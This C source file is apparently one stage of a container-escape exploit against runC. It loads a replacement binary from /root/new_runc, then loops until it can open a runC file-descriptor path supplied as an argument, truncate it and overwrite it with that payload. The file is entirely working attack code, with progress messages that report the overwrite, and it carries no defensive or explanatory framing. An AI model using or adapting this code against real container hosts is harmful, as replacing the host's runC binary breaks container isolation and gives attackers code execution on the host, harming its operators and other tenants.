#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>


/* Simple Buffer*/
typedef struct Buffer
{
	int len;		// buffer length
	void * buff;	// buffer data
} Buffer;

#define FALSE 0
#define TRUE  1

const char * DEFAULT_NEW_RUNC_PATH = "/root/new_runc";
const unsigned int PATH_MAX_LEN = 30;

const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;

Buffer read_new_runc(char * new_runc_path);


/*
* Usage: overwrite_runc <path a file reffering to the runC binary>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int  runc_fd_write, wc;
	char * runc_fd_path;
	char * new_runc_path;                    	 // path to file to replace runc
	Buffer new_runc;


	printf("\t-> Starting\n");
	fflush(stdout);

	/* Read new_runc */
	runc_fd_path = argv[1];
	new_runc_path = DEFAULT_NEW_RUNC_PATH;
	new_runc = read_new_runc(new_runc_path);
	if (new_runc.buff == NULL)
	{
		return RET_ERR;
	}	

	/* Try to open runc_fd_path for writing      */
	/* Should Succeed when no runC process are executed, normally at first try  */
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		runc_fd_write = open(runc_fd_path, O_WRONLY | O_TRUNC);
		if (runc_fd_write != OPEN_ERR)
		{
			printf("\t-> Opened %s for writing\n", runc_fd_path);
			wc = write(runc_fd_write, new_runc.buff, new_runc.len);
			if (wc !=  new_runc.len)
			{
				printf("\t[!] Couldn't write to my process's runC's fd %s\n", runc_fd_path);
				fflush(stdout);
				close(runc_fd_write);
				free(new_runc.buff);
				return RET_ERR;
			}
			printf("\t-> Overwrote runC\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(runc_fd_write);
	free(new_runc.buff);
	if (opened == FALSE)
	{
		printf("\t[!] Reached timeout, couldn't write to runc at %s\n", runc_fd_path);
		fflush(stdout);
		return RET_ERR;
	}
	else
	{
		printf("\t-> Success, shuting down ...\n");
		fflush(stdout);
	}
	return RET_OK;
}

/*
*
* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.
*
*/
Buffer read_new_runc(char * new_runc_path)
{
	Buffer new_runc = {0, NULL};
	FILE *fp_new_runc;
	int file_size, rc;
	void * new_runc_content;
	char ch;

	// open new_Runc
	fp_new_runc = fopen(new_runc_path, "r"); // read mode
	if (fp_new_runc == NULL)
	{
	  printf("[!] open file err while opening the new runc file %s\n", new_runc_path);
	  return new_runc;
	}

	// Get file size and prepare buff
	fseek(fp_new_runc, 0L, SEEK_END);
	file_size = ftell(fp_new_runc);
	new_runc_content = malloc(file_size);
	rewind(fp_new_runc);

	rc = fread(new_runc_content, 1, file_size, fp_new_runc);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from new runc file at %s\n", new_runc_path);
		free(new_runc_content);
		return new_runc;
	}

	fclose(fp_new_runc);
	new_runc.len = rc;
	new_runc.buff = new_runc_content;
	return new_runc;

}
